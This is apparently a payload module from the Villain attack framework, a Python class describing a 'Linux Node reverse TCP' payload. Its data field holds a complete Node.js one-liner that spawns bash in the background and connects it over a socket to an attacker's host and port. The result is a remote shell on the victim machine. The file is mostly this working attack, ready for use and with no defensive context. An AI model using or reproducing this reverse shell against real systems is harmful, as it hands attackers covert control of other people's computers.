# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Linux Node reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Classic Node reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'node',
        'os' : 'linux'
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = "nohup node -e \'!function(){var n=require(\"net\"),e=require(\"child_process\").spawn(\"bash\",[]),t=new n.Socket;t.connect(*LPORT*,\"*LHOST*\",function(){t.pipe(e.stdin),e.stdout.pipe(t),e.stderr.pipe(t)})}();\' & disown"
   
